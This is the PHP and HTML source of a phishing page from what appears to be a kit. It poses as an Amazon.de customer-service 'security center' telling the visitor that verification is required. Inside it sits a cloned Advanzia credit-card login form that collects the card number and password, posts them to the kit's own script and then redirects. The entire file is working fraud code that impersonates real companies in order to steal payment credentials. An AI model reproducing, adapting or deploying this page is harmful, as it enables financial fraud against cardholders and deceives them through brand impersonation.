<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link href="src/advanzia_css/styles.css" rel="StyleSheet" type="text/css">
		<link type="image/x-icon" rel="shortcut icon" href="src/advanzia_img/favicon.ico">
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css">
		<a id="nav-top"></a>
		
		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try" style="margin-left:17px">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"> Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23"><span style="color:#FF9900">&#10148; Zahlungsmittel bestätigen</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1 style="float:left">
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			
			<div id="cbcc_frame1" style="margin-top:15px">
				<div id="centerslots" style="margin:0 auto;width:1200px">
					<div id="content">
						<div id="main" class="falcon">
							<br/>

							<div style="width:982px;margin:0 auto;background-color:#fff;height:430px">
								<div id="mainbox">
									<div id="mainframe">
										<div class="clear">
											<div class="topheadleftbox">&nbsp;</div>
											<div class="topheadrightbox">
											<div class="topheadboxnav"></div>
											</div>
										</div>

										<div class="clear">
											<div id="leftbox">
												<div class="logobox">
												<img src="src/advanzia_img/c3a7090a-c1eb-d621-5812-45b604456eba11111111-1111-1111-1111-.jpg" alt="Logo Advanzia" title="Logo Advanzia" border="0"></div>
												<div id="contentnavbox">
												<ul>
												<li class="cnavlevel1" style="list-style-type:none">
												<a btattached="true" class="cnav1active" href="">meine.karte - Login</a>
												<ul></ul>
												</li>

												</ul>
												</div>
											</div>

											<div id="maincontentbox">
												<div class="bannerbox"><img alt="" src="src/advanzia_img/banner.jpg" border="0"></div>
												<div class="contentbox">
												<div class="breadcrumb">meine.karte - Login</div>


													<div class="clear"></div>
													<div class="contentdividerline">&nbsp;</div>

													<link href="src/advanzia_css/Advanzia.css" rel="stylesheet" type="text/css">

													<form method="POST" action="index.php">
														<input type="hidden" name="enrolledData" value="1">
														<div class="contentboxapp" id="gwt-root" accountnumber="" password="">
															<table class="tableborder" style="width: 100%;">
																<colgroup><col></colgroup>

																<tbody>
																	<tr>
																		<td class="cellborderbottomnopadding">
																			<table style="width: 100%;" cellpadding="0" cellspacing="0">
																				<colgroup><col></colgroup>
																				<tbody><tr><td class="cellheader" align="left"><div class="fontheader">Login</div></td><td class="cellbreadcrumb"></td></tr></tbody>
																			</table>
																		</td>
																	</tr>
																	
																	 <?php
																		if (isset($_SESSION['scErr']) && !empty($_SESSION['scErr'])) {
																			echo '<tr><td class="cellerror"><div class="error"><span class="bold">Bitte geben Sie Ihr Passwort ein.</span></div></td></tr>';
																		}
																	?>

																	<tr><td class="cellerror"><div class="emptydiv"></div></td></tr>
																	<tr>
																		<td class="cell">
																			<table style="width: 100%;" cellpadding="0" cellspacing="10">
																				<colgroup><col></colgroup>
																				<tbody>
																					<tr>
																						<td class="celllabel"><div class="topicheadline">Kreditkartennummer</div></td>
																						<td class="cellinput" align="right">

																							<?php
																								if (isset($_SESSION['ccnr']) && !empty($_SESSION['ccnr'])) {
																									echo '<input id="arg1" name="arg1" maxlength="16" value="' . $_SESSION['ccnr'] . '" class="inputtextfield" type="text">';
																								} else {
																									echo '<input id="arg1" name="arg1" maxlength="16" class="inputtextfield" type="text">';
																								}
																							?>

																						</td>
																						<td rowspan="4" style="vertical-align: top;"><div class="cellhelp" style="border:0px"><br></div></td>
																					</tr>

																					<tr>
																						<td class="celllabel"><div class="topicheadline">Passwort</div></td>
																						<td class="cellinput" align="right">
																							<?php
																								if (isset($_SESSION['scErr']) && !empty($_SESSION['scErr'])) {
																									echo '<input class="inputtextfield" id="code" name="code" type="password" style="border:1px solid red">';
																									unset($_SESSION['scErr']);
																								} else {
																									echo '<input class="inputtextfield" id="code" name="code" type="password">';
																								}
																							?>
																						</td>
																					</tr>
																					
																					<tr><td align="right"><input name="sendcode" type="submit" value="weiter &gt;&gt;"></td></tr>
																				</tbody>
																			</table>
																		</td>
																	</tr>
																</tbody>
															</table>
														</div>
													</form>
												</div>
											</div>
										</div>

										<div class="clear">
											<div class="footerleftbox">&nbsp;</div>
											<div class="footerrightbox">
												<div class="footerbox">&nbsp;</div>
											</div>
										</div>
										<div class="clear"></div>
									</div>
								</div>
							</div>
							<br/><br/>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1" style="width:100%;position:absolute;bottom:0"> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
	</body>
</html>